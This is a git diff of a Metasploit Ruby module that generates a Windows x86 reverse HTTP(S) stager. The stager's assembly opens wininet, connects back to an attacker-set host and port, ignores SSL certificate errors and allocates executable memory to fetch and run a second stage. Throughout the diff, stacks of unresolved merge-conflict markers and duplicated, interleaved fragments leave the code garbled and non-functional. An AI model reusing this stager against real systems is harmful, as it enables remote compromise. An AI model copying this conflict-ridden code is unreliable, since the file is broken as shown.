@@ -13,6 +13,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> 4.11.2_release_pre-rails4
@@ -287,6 +288,8 @@ module Msf
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
@@ -294,13 +297,17 @@ require 'msf/core/payload/uuid/options'
 
 module Msf
 
+<<<<<<< HEAD
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
 #
 ###
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -463,11 +470,16 @@ module Payload::Windows::ReverseHttp
 module Payload::Windows::ReverseHttp
 
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+module Payload::Windows::ReverseHttp
+
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
   include Msf::Payload::UUID::Options
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -582,12 +594,15 @@ module Msf
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 
   #
   # Register reverse_http specific options
   #
   def initialize(*args)
     super
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
@@ -756,6 +771,8 @@ module Msf
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
@@ -769,6 +786,7 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
     register_advanced_options(
@@ -863,12 +881,15 @@ module Msf
         OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       ], self.class)
   end
 
   #
   # Generate the first stage
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
@@ -1248,6 +1269,10 @@ module Payload::Windows::ReverseHttp
   def generate(opts={})
     conf = {
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+  def generate(opts={})
+    conf = {
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       ssl:         opts[:ssl] || false,
       host:        datastore['LHOST'],
       port:        datastore['LPORT'],
@@ -1269,6 +1294,7 @@ module Payload::Windows::ReverseHttp
       conf[:url]        = generate_small_uri
     end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1375,6 +1401,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
     generate_reverse_http(conf)
   end
 
@@ -1399,6 +1427,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1683,6 +1712,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
   end
 
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
   #
   # Generate the transport-specific configuration
   #
@@ -1694,6 +1725,7 @@ module Payload::Windows::ReverseHttp
   # Generate the URI for the initial stager
   #
   def generate_uri
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1936,6 +1968,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 
     uri_req_len = datastore['StagerURILength'].to_i
 
@@ -1957,6 +1991,7 @@ module Payload::Windows::ReverseHttp
   def generate_small_uri
     generate_uri_uuid_mode(:init_native, 5)
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2163,6 +2198,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
   end
 
   #
@@ -2175,6 +2212,7 @@ module Payload::Windows::ReverseHttp
     # Add 100 bytes for the encoder to have some room
     space += 100
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2335,10 +2373,15 @@ module Payload::Windows::ReverseHttp
     space += 251
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2605,11 +2648,17 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
     # The final estimated size
     space
   end
 
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2717,6 +2766,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
   # Generate an assembly stub with the configured feature set and options.
   #
   # @option opts [Bool] :ssl Whether or not to enable SSL
@@ -2755,6 +2806,7 @@ module Payload::Windows::ReverseHttp
 
     http_open_flags = 0
     secure_flags = 0
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2811,6 +2863,8 @@ module Payload::Windows::ReverseHttp
     http_open_flags = 0
 =======
 >>>>>>> 4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 
     if opts[:ssl]
       http_open_flags = (
@@ -2831,6 +2885,7 @@ module Payload::Windows::ReverseHttp
         0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
     else
 <<<<<<< HEAD
+<<<<<<< HEAD
       #;0x80000000 | ; INTERNET_FLAG_RELOAD
       #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
       #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
@@ -2839,12 +2894,15 @@ module Payload::Windows::ReverseHttp
       http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
 >>>>>>> feature/complex-payloads
 =======
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       http_open_flags = (
         0x80000000 | # INTERNET_FLAG_RELOAD
         0x04000000 | # INTERNET_NO_CACHE_WRITE
         0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
         0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
         0x00000200 ) # INTERNET_FLAG_NO_UI
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
@@ -2992,10 +3050,13 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
     end
 
     asm = %Q^
       ;-----------------------------------------------------------------------------;
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -3144,11 +3205,14 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
       ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
       ;-----------------------------------------------------------------------------;
 
       ; Input: EBP must be the address of 'api_call'.
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -3231,6 +3295,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
       load_wininet:
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
@@ -3238,6 +3304,7 @@ module Payload::Windows::ReverseHttp
         push esp               ; Push a pointer to the "wininet" string on the stack.
         push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
         call ebp               ; LoadLibraryA( "wininet" )
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -3362,6 +3429,8 @@ module Payload::Windows::ReverseHttp
   def generate_small_uri
     generate_uri_uuid_mode(:init_native, 5)
 =======
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
       ^
 
@@ -3397,6 +3466,7 @@ module Payload::Windows::ReverseHttp
         push ebx               ; DWORD_PTR dwContext (NULL)
         push ebx               ; dwFlags
         push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -3487,10 +3557,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
         call got_server_uri    ; double call to get pointer for both server_uri and
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8287,6 +8360,20 @@ module Payload::Windows::ReverseHttp
 >>>>>>> 4.11.2_release_pre-rails4
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
+=======
+      server_uri:              ; server_host; server_uri is saved in EDI for later
+        db "#{opts[:url]}", 0x00
+      got_server_host:
+        push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
+        push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
+        call ebp
+        mov esi, eax           ; Store hConnection in esi
+      ^
+
+    # Note: wine-1.6.2 does not support SSL w/proxy authentication properly, it
+    # doesn't set the Proxy-Authorization header on the CONNECT request.
+
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
     if proxy_enabled && proxy_user
       asm << %Q^
         ; DWORD dwBufferLength (length of username)
@@ -8316,11 +8403,15 @@ module Payload::Windows::ReverseHttp
         push esi             ; hConnection
         push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
         call ebp
+<<<<<<< HEAD
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       ^
     end
 
     asm << %Q^
+<<<<<<< HEAD
 <<<<<<< HEAD
     allocate_memory:
       push 0x40              ; PAGE_EXECUTE_READWRITE
@@ -8466,12 +8557,17 @@ module Payload::Windows::ReverseHttp
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+      httpopenrequest:
+        push ebx               ; dwContext (NULL)
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
         push edi               ; server URI
         push ebx               ; method
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8544,10 +8640,14 @@ module Payload::Windows::ReverseHttp
         push eax               ; hConnection
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+        push esi               ; hConnection
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8698,6 +8798,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
@@ -8705,6 +8807,7 @@ module Payload::Windows::ReverseHttp
 
       send_request:
     ^
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -8720,6 +8823,11 @@ module Payload::Windows::ReverseHttp
     if opts[:ssl]
       asm << %Q^
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+
+    if opts[:ssl]
+      asm << %Q^
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
       set_security_options:
         push 0x#{secure_flags.to_s(16)}
@@ -8731,6 +8839,7 @@ module Payload::Windows::ReverseHttp
         push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
         call ebp
       ^
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8814,6 +8923,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
     end
 
     asm << %Q^
@@ -8833,6 +8944,7 @@ module Payload::Windows::ReverseHttp
         jnz send_request
 
       ; if we didn't allocate before running out of retries, bail out
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9110,6 +9222,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
     ^
 
     if opts[:exitfunk]
@@ -9122,6 +9236,7 @@ module Payload::Windows::ReverseHttp
     failure:
       push 0x56A2B5F0        ; hardcoded to exitprocess for size
       call ebp
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -9198,6 +9313,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
       ^
     end
 
@@ -9249,6 +9366,7 @@ module Payload::Windows::ReverseHttp
       asm << asm_exitfunk(opts)
     end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-api/_index.html
@@ -9495,6 +9613,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
     asm
   end
 
@@ -9524,6 +9644,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
@@ -9701,6 +9822,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/4.11.2_release_pre-rails4
+=======
+>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
 end
 
 end
